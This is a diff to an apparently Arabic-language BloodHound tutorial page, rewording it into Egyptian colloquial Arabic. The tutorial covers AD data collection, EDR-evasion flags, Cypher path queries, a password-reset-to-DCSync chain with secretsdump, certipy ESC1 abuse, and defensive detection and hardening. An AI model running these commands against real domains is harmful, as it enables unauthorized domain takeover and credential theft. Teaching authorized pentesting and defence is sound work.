@@ -7,29 +7,29 @@ export default function Page() {
       <L
         ar={
           <>
-            <Section title="ما هو BloodHound — و لماذا غيّر AD pentesting إلى الأبد؟">
+            <Section title="إيه هو BloodHound — وليه غيّر AD pentesting للأبد؟">
               <Analogy>
-                Active Directory مثل مدينة فيها عشرات آلاف الموظفين، الأبواب، البطاقات، الصلاحيات. قبل BloodHound، المهاجم
-                يفحص باباً واحداً في كل مرة. مع BloodHound، تستورد كل المدينة في graph database و تسأله: <b>"ما أقصر طريق من
-                هذا الباب الجانبي إلى مكتب الـ CEO؟"</b> — و يرسم لك السلسلة كاملة بضغطة زر.
+                Active Directory زي مدينة فيها عشرات الآلاف من الموظفين والأبواب والبطاقات والصلاحيات. قبل BloodHound، المهاجم
+                كان بيفحص باب واحد في المرة. مع BloodHound، إنت بتحمل المدينة كلها في graph database وتسأله: <b>"إيه أقصر طريق من
+                الباب الجانبي ده لمكتب الـ CEO؟"</b> — وهو يرسم لك السلسلة كاملة بكليك واحد.
               </Analogy>
-              <Callout kind="danger" title="استخدام مصرّح به فقط">
-                BloodHound يجمع كم هائل من بيانات الـ AD. تشغيله ضد domain غير مفوّض = جريمة. استخدمه في pentest موقّع، أو
-                مختبر AD محلي (HTB Pro Labs، GOAD، VulnLab).
+              <Callout kind="danger" title="إذن رسمي بس">
+                BloodHound بيلم كم رهيب من بيانات الـ AD. تشغيله على domain من غير تفويض = جريمة. استخدمه في pentest معاك فيه عقد، أو
+                في معمل AD محلي (HTB Pro Labs، GOAD، VulnLab).
               </Callout>
               <p className="opacity-80">
-                BloodHound CE (Community Edition) هو الـ standard الحالي (2024+) — استبدل النسخة القديمة Legacy. هو
-                client-server: <b>SharpHound/AzureHound</b> يجمع، <b>BloodHound CE</b> يحلّل و يُصوّر.
+                BloodHound CE (Community Edition) هو الـ standard الحالي (2024+) — حل محل النسخة القديمة Legacy. النظام
+                client-server: <b>SharpHound/AzureHound</b> بيلم، و<b>BloodHound CE</b> بيحلل ويرسم.
               </p>
             </Section>
 
-            <Section title="مكونات النظام — افهم القطع قبل التشغيل">
+            <Section title="مكونات النظام — اعرف القطع قبل ما تشغل أي حاجة">
               <ul className="list-disc pe-6 space-y-2 opacity-90">
-                <li><b>SharpHound</b> (.NET): الـ collector لـ on-prem Active Directory. يُشغّل من جهاز مرتبط بالـ domain (أو Linux مع creds).</li>
-                <li><b>AzureHound</b> (Go): الـ collector لـ Azure AD / Entra ID. يقرأ Microsoft Graph + ARM APIs.</li>
-                <li><b>BloodHound CE</b>: التطبيق الذي يستورد JSON و يعرض الـ graph.</li>
-                <li><b>Neo4j</b>: قاعدة بيانات graph الخلفية. لا تتفاعل معها مباشرة عادة، لكن يمكنك الاستعلام بـ Cypher.</li>
-                <li><b>الـ "Edges"</b>: العلاقات (MemberOf, AdminTo, GenericAll, ForceChangePassword, …) — هذه هي قلب التحليل.</li>
+                <li><b>SharpHound</b> (.NET): الـ collector لـ on-prem Active Directory. بيشتغل من جهاز مربوط بالـ domain (أو من لينكس مع credentials).</li>
+                <li><b>AzureHound</b> (Go): الـ collector لـ Azure AD / Entra ID. بيقرا Microsoft Graph + ARM APIs.</li>
+                <li><b>BloodHound CE</b>: التطبيق اللي بيستورد الـ JSON ويعرض الجراف.</li>
+                <li><b>Neo4j</b>: قاعدة بيانات الجراف اللي تحت. مش بتتعامل معاها مباشرة في الغالب، بس تقدر تستعلم منها بـ Cypher.</li>
+                <li><b>الـ "Edges"</b>: العلاقات (MemberOf, AdminTo, GenericAll, ForceChangePassword, …) — دي قلب التحليل كله.</li>
               </ul>
             </Section>
 
@@ -43,8 +43,8 @@ docker compose up
 # username: admin, password يُطبع في log أول تشغيل
 docker logs bloodhound 2>&1 | grep "Initial Password"`}</Code>
               <Callout kind="warn" title="ملاحظة سريعة">
-                <p>BloodHound CE يستبدل BloodHound Legacy. إن وجدت دروساً قديمة تذكر <code>BloodHound.exe</code>، فهي legacy. الـ CE
-                  ويب-بيس و أكثر استقراراً.</p>
+                <p>BloodHound CE حل محل BloodHound Legacy. لو لقيت دروس قديمة بتقولك <code>BloodHound.exe</code>، دي legacy. الـ CE
+                  web-based وأكثر استقراراً بكتير.</p>
               </Callout>
             </Section>
 
@@ -71,19 +71,19 @@ bloodhound-python -d corp.local -u user -p 'Pass!23' \\
   -c all -ns 10.10.10.10 --zip
 # يخرج .zip جاهز للرفع`}</Code>
               </Step>
-              <Step n={3} title="OPSEC أثناء الجمع">
+              <Step n={3} title="OPSEC وقت الجمع">
                 <ul className="list-disc pe-6 space-y-1">
-                  <li><b>--Stealth</b>: يخفّف الضوضاء، يتجاوز الـ collection methods التي تستفز EDR.</li>
+                  <li><b>--Stealth</b>: بيقلل الضوضاء، بيتفادى الـ collection methods اللي بتستفز الـ EDR.</li>
                   <li><b>--JitterPercent 30 --Throttle 1000</b>: عشوائية + تأخير بين الطلبات.</li>
-                  <li><b>--ExcludeDomainControllers</b>: لا تفحص DCs مباشرة — قد تستفز ATA/Defender for Identity.</li>
-                  <li><b>تجنب All في بيئة محرجة</b>: <code>-c DCOnly,Group,LocalGroup,GPOLocalGroup,Trusts,ACL</code> أكثر هدوءاً.</li>
-                  <li><b>ابدأ بـ DCOnly</b>: لو نجح بدون كشف، توسّع تدريجياً.</li>
+                  <li><b>--ExcludeDomainControllers</b>: متفحصش الـ DCs مباشرة — ممكن تستفز ATA / Defender for Identity.</li>
+                  <li><b>ابعد عن All في بيئة حساسة</b>: <code>-c DCOnly,Group,LocalGroup,GPOLocalGroup,Trusts,ACL</code> أهدا.</li>
+                  <li><b>ابدأ بـ DCOnly</b>: لو عدّى من غير ما حد يحس، وسّع تدريجياً.</li>
                 </ul>
               </Step>
               <Step n={4} title="الرفع لـ BloodHound">
-                <Code lang="text">{`BloodHound CE → الزر "File Ingest" → Drag & drop الـ .zip
-أو في legacy: ادخل واجهة Neo4j → Upload Data → اختر JSON files
-الانتظار: domain متوسط ~15-30 دقيقة على import`}</Code>
+                <Code lang="text">{`BloodHound CE → زرار "File Ingest" → اسحب وأفلت الـ .zip
+أو في legacy: ادخل واجهة Neo4j → Upload Data → اختار ملفات الـ JSON
+وقت الانتظار: domain متوسط ~15-30 دقيقة عشان يتعمل import`}</Code>
               </Step>
             </Section>
 
@@ -96,15 +96,15 @@ azurehound list -u 'user@tenant.onmicrosoft.com' -p 'Pass!' \\
 azurehound -r '<refresh_token>' --tenant ... list
 
 # يجمع: users, groups, apps, service principals, role assignments, devices, subscriptions, RGs`}</Code>
-              <Callout kind="warn" title="نقاط قوة Azure">
-                BloodHound يكشف pivots حقيقية في Azure مثل: <b>service principal له role في إيجار آخر</b>، أو <b>group nested
-                  membership عبر external invite</b>، أو <b>subscription Owner من عبر cross-tenant trust</b>. لا تجد هذه إلا
-                بـ graph traversal.
+              <Callout kind="warn" title="ليه Azure مهم">
+                BloodHound بيكشف pivots حقيقية في Azure زي: <b>service principal معاه role في tenant تاني</b>، أو <b>nested
+                  group membership عن طريق external invite</b>، أو <b>subscription Owner عن طريق cross-tenant trust</b>. الحاجات
+                دي مش هتلاقيها إلا بالـ graph traversal.
               </Callout>
             </Section>
 
-            <Section title="الاستعلامات الجاهزة — قائمة العشرين الأولى">
-              <p className="opacity-90">في BloodHound اضغط على Search → Pre-built Queries:</p>
+            <Section title="الاستعلامات الجاهزة — أول 20 محتاج تعرفها">
+              <p className="opacity-90">في BloodHound اضغط Search → Pre-built Queries:</p>
               <TwoCol>
                 <Card title="Quick Wins" color="red">
                   <ul className="list-disc pe-6 space-y-1">
@@ -145,10 +145,10 @@ azurehound -r '<refresh_token>' --tenant ... list
               </TwoCol>
             </Section>
 
-            <Section title="Cypher — لغة BloodHound السرّية">
+            <Section title="Cypher — اللغة السرّية لـ BloodHound">
               <Analogy>
-                SQL يقول: "أعطني صفوفاً". Cypher يقول: "ارسم لي شكلاً". الجداول vs الـ graphs. كل شخص محترف في BloodHound
-                يكتب Cypher، لأن الاستعلامات الجاهزة تغطي 30% فقط من الحالات.
+                SQL بيقولك: "هاتلي صفوف". Cypher بيقولك: "ارسملي شكل". جداول vs جراف. أي محترف في BloodHound بيكتب Cypher،
+                لأن الاستعلامات الجاهزة بتغطي 30% بس من الحالات الحقيقية.
               </Analogy>
               <Code lang="cypher">{`// 1) كل المسارات من user محدد إلى Domain Admins
 MATCH p=shortestPath((u:User {name:"BOB@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
@@ -184,7 +184,7 @@ RETURN u.name, u.lastlogon
 ORDER BY u.lastlogon`}</Code>
             </Section>
 
-            <Section title="مفهوم Edges — أهم 15 يجب أن تعرفها">
+            <Section title="الـ Edges — أهم 15 لازم تحفظهم">
               <TwoCol>
                 <Card title="عضويات و ACL" color="red">
                   <ul className="list-disc pe-6 space-y-1">
@@ -223,34 +223,34 @@ ORDER BY u.lastlogon`}</Code>
 
             <Section title="سيناريو حقيقي — من Domain User لـ Domain Admin في 4 خطوات">
               <Step n={1} title="Mark as Owned">
-                <p>التقطت hash لـ <code>jsmith</code> عبر Responder. كليك يمين عليه في BloodHound → Mark User as Owned.</p>
+                <p>لقطت hash لـ <code>jsmith</code> عن طريق Responder. كليك يمين عليه في BloodHound → Mark User as Owned.</p>
               </Step>
               <Step n={2} title="Shortest Path from Owned">
-                <p>قم بتشغيل الاستعلام الجاهز "Shortest Paths from Owned Principals". ترى:</p>
+                <p>شغّل الاستعلام الجاهز "Shortest Paths from Owned Principals". هتشوف:</p>
                 <Code lang="text">{`jsmith → MemberOf → IT-SUPPORT
 IT-SUPPORT → ForceChangePassword → svc_backup
 svc_backup → MemberOf → BACKUP_OPERATORS
 BACKUP_OPERATORS → DCSync → CORP.LOCAL`}</Code>
               </Step>
               <Step n={3} title="نفّذ السلسلة">
-                <Code lang="bash">{`# 1) jsmith → غيّر كلمة سر svc_backup
+                <Code lang="bash">{`# 1) jsmith → غيّر باسورد svc_backup
 net user svc_backup NewP@ss123 /domain
-# أو via Set-DomainUserPassword (PowerView)
+# أو عن طريق Set-DomainUserPassword (PowerView)
 Set-DomainUserPassword -Identity svc_backup -AccountPassword (ConvertTo-SecureString 'NewP@ss123' -AsPlainText -Force)
 
-# 2) سجّل دخول كـ svc_backup → نفّذ DCSync
+# 2) سجل دخول كـ svc_backup → نفذ DCSync
 secretsdump.py CORP/svc_backup:'NewP@ss123'@DC.CORP.LOCAL -just-dc
 
-# هنا: كل NTLM hashes في الـ domain → including krbtgt → Golden Ticket forever`}</Code>
+# النتيجة: كل NTLM hashes في الدومين → بما فيهم krbtgt → Golden Ticket للأبد`}</Code>
               </Step>
-              <Step n={4} title="نظّف">
-                <p>أعد كلمة سر svc_backup للقيمة الأصلية إن أمكن. وثّق كل خطوة في الـ report. لا تترك ticketing artifacts.</p>
+              <Step n={4} title="نظّف وراك">
+                <p>رجّع باسورد svc_backup للقيمة الأصلية لو قدرت. وثّق كل خطوة في التقرير. متسبش ticketing artifacts.</p>
               </Step>
             </Section>
 
-            <Section title="ADCS — ESC1 إلى ESC15 عبر BloodHound">
+            <Section title="ADCS — ESC1 لـ ESC15 عن طريق BloodHound">
               <p className="opacity-90">
-                BloodHound CE يكشف <b>كل</b> ESC paths تلقائياً عبر edges مخصصة:
+                BloodHound CE بيكشف <b>كل</b> الـ ESC paths أوتوماتيك عن طريق edges مخصصة:
               </p>
               <ul className="list-disc pe-6 space-y-1 opacity-90">
                 <li><b>ADCSESC1</b>: قالب يسمح بـ SAN spoofing → certificate كأي مستخدم.</li>
@@ -268,45 +268,45 @@ certipy req -u user@corp.local -p Pass! -ca CORP-CA \\
 # نتيجة: cert يصادق كـ administrator → DA`}</Code>
             </Section>
 
-            <Section title="نصائح احترافية يستخدمها red teams">
+            <Section title="نصايح احترافية الـ Red Teams بيستخدموها">
               <ol className="list-decimal pe-6 space-y-2 opacity-90">
-                <li><b>اجمع البيانات قبل الحاجة</b>: SharpHound في بداية الـ engagement حتى لو لا تعرف ماذا ستفعل بها.</li>
-                <li><b>استورد على instance خاص</b>: لا تخلط بيانات clients. Docker per-engagement.</li>
-                <li><b>اضغط على عقدة و اختر "Set as Starting Node"</b> + "Set as Ending Node" → "Pathfinding".</li>
-                <li><b>"Mark as High Value"</b> للأنظمة الحساسة (file servers، Exchange، PKI، Tier-0). Pathfinding يفضّلها.</li>
-                <li><b>استخدم Tab "Analysis"</b> — fans-out and fans-in counts تكشف bottlenecks في الـ AD.</li>
-                <li><b>Custom queries.json</b>: احفظ Cypher الخاصة بك للاستخدام عبر engagements.</li>
-                <li><b>تتبّع الـ "Outbound Object Control"</b> لكل user تخترقه — ماذا يستطيع أن يعمل؟</li>
-                <li><b>BloodHound + ldapdomaindump</b>: تكاملان جيد، ldapdomaindump أسرع للملخصات النصية.</li>
-                <li><b>لا تنسَ الـ trusts</b>: غالباً ما يُهمل، لكن child domain trust → forest pivot.</li>
-                <li><b>قبل كل اختراق: Cypher يخبرك بأقصر طريق</b>. لا تتحرك أعمى. كل عضوية مجموعة تضيفها = ضوضاء.</li>
+                <li><b>اجمع الداتا قبل ما تحتاجها</b>: شغّل SharpHound أول الـ engagement حتى لو معرفش هتعمل بيها إيه.</li>
+                <li><b>استورد على instance خاص</b>: متخلطش بيانات الـ clients ببعض. Docker لكل engagement.</li>
+                <li><b>اضغط على نود واختار "Set as Starting Node"</b> + "Set as Ending Node" → "Pathfinding".</li>
+                <li><b>"Mark as High Value"</b> للأنظمة الحساسة (file servers، Exchange، PKI، Tier-0). الـ Pathfinding بيفضّلها.</li>
+                <li><b>استخدم تبويب "Analysis"</b> — fan-out / fan-in counts بتكشف الـ bottlenecks في الـ AD.</li>
+                <li><b>Custom queries.json</b>: احفظ الـ Cypher بتاعتك عشان تستخدمها عبر engagements.</li>
+                <li><b>تابع الـ "Outbound Object Control"</b> لكل user بتخترقه — هو يقدر يلمس إيه؟</li>
+                <li><b>BloodHound + ldapdomaindump</b>: مكملين بعض، الـ ldapdomaindump أسرع للملخصات النصية.</li>
+                <li><b>متنساش الـ trusts</b>: ناس كتير بتسيبها، لكن child domain trust = forest pivot.</li>
+                <li><b>قبل أي حركة: Cypher بيقولك أقصر طريق</b>. متتحركش أعمى. كل group بتنضم لها = ضوضاء.</li>
               </ol>
             </Section>
 
-            <Section title="الكشف من جانب الدفاع — كيف تُلتقط؟">
-              <Callout kind="warn" title="مؤشرات تشغيل SharpHound">
+            <Section title="من جهة الدفاع — هتتمسك إزاي؟">
+              <Callout kind="warn" title="إشارات تشغيل SharpHound">
                 <ul className="list-disc pe-6 space-y-1">
                   <li>كم هائل من LDAP queries من جهاز واحد في وقت قصير.</li>
-                  <li>SMB sessions مع كل host في الـ domain (lateral session enumeration).</li>
-                  <li>Microsoft Defender for Identity ينبّه على "Reconnaissance using directory services queries".</li>
-                  <li>Honey objects: حساب وهمي بـ SPN جذّاب → لو تم Kerberoast = مهاجم.</li>
-                  <li>ACL changes غير معتادة، خاصة على gMSA و LAPS-readable groups.</li>
+                  <li>SMB sessions على كل host في الدومين (lateral session enumeration).</li>
+                  <li>Microsoft Defender for Identity بيرفع تنبيه "Reconnaissance using directory services queries".</li>
+                  <li>Honey objects: حساب وهمي بـ SPN مغري → لو اتعمل له Kerberoast = مهاجم بنسبة 100%.</li>
+                  <li>تغييرات ACL غير معتادة، خصوصاً على gMSA وLAPS-readable groups.</li>
                 </ul>
               </Callout>
             </Section>
 
-            <Section title="الدفاع — هندسة AD غير قابلة للـ BloodHound">
+            <Section title="الدفاع — هندسة AD صعب على BloodHound">
               <Callout kind="good" title="مرجع دفاعي عملي">
                 <ol className="list-decimal pe-6 space-y-2">
-                  <li><b>Tier model</b> صارم: Tier-0 (DC, ADCS, Entra Connect)، Tier-1 (servers)، Tier-2 (workstations). لا تسجيل دخول عبر الـ tiers.</li>
-                  <li><b>LAPS لكل local admin</b>: كل جهاز كلمة سر فريدة، تتغيّر دورياً.</li>
-                  <li><b>Kerberoast hardening</b>: gMSA لكل service account، disable RC4، AES فقط.</li>
-                  <li><b>ADCS hardening</b>: راجع كل template، disable SAN في user templates، EDITF_ATTRIBUTESUBJECTALTNAME2 معطّل.</li>
-                  <li><b>Constrained delegation فقط</b> — لا Unconstrained على أي host.</li>
-                  <li><b>راقب ACL changes على objects قيّمة</b> — تنبيه فوري.</li>
+                  <li><b>Tier model صارم</b>: Tier-0 (DC, ADCS, Entra Connect)، Tier-1 (servers)، Tier-2 (workstations). مفيش login عبر الـ tiers.</li>
+                  <li><b>LAPS لكل local admin</b>: كل جهاز معاه باسورد فريد، بيتغير دورياً.</li>
+                  <li><b>Kerberoast hardening</b>: gMSA لكل service account، اقفل RC4، AES بس.</li>
+                  <li><b>ADCS hardening</b>: راجع كل template، اقفل SAN في user templates، خلي EDITF_ATTRIBUTESUBJECTALTNAME2 مقفول.</li>
+                  <li><b>Constrained delegation بس</b> — مفيش Unconstrained على أي host.</li>
+                  <li><b>راقب تغييرات الـ ACL على objects قيّمة</b> — تنبيه فوري.</li>
                   <li><b>Privileged Access Workstations (PAW)</b> لـ Tier-0 admins.</li>
-                  <li><b>شغّل BloodHound على نفسك دورياً</b> — اعرف paths قبل المهاجم.</li>
-                  <li><b>Microsoft Defender for Identity (مدفوع)</b> — يكشف معظم تقنيات BloodHound + Kerberoast + DCSync.</li>
+                  <li><b>شغّل BloodHound على نفسك دورياً</b> — اعرف الـ paths قبل المهاجم.</li>
+                  <li><b>Microsoft Defender for Identity (مدفوع)</b> — بيكشف أغلب تكنيكات BloodHound + Kerberoast + DCSync.</li>
                 </ol>
               </Callout>
             </Section>
